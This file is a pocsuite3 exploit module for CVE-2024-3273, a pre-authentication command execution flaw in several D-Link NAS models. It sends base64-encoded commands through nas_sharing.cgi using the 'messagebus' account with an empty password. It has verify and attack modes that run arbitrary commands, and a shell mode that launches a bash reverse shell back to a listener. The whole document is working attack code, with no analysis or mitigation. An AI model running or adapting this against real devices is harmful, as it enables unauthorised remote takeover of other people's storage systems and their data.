#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import base64
from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
    CEye,
    get_listener_ip, get_listener_port, REVERSE_PAYLOAD
)

minimum_version_required('1.9.6')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = 'changge'
    vulDate = '2024-04-09'
    createDate = '2024-04-09'
    updateDate = '2024-04-09'
    references = []
    name = 'D-Link nas Pre-Auth Command Execution (CVE-2024-3273)'
    appPowerLink = ''
    appName = 'nas'
    appVersion = 'D-Link DNS-320L，DNS-325，DNS-327，DNS-340L，D-Link NAS Storage'
    vulType = 'Command Execution'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''

    def _options(self):
        o = OrderedDict()
        o['cmd'] = OptString('uname -a', description='The command to execute')
        return o

    def _exploit(self, param=''):
        if not self._check(dork=''):
            return False

        url = f"{self.url}/cgi-bin/nas_sharing.cgi?user=messagebus&passwd==&cmd=15&system={base64.b64encode(param.encode()).decode()}"
        headers = {'Connection': 'Keep-Alive'}
        res = requests.get(url, headers=headers)
        logger.debug(res.text)
        return res.text

    def _verify(self):
        result = {}
        param = f'id'
        res = self._exploit(param)
        if "uid" in res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo'][param] = res
        return self.parse_output(result)

    def _attack(self):
        result = {}
        param = self.get_option('cmd')
        # param = base64.b64encode(cmd.encode()).decode()
        res = self._exploit(param)
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = self.url
        result['VerifyInfo'][param] = res
        return self.parse_output(result)

    def _shell(self):
        try:
            self._exploit(REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port()))
        except Exception:
            pass


register_poc(DemoPOC)
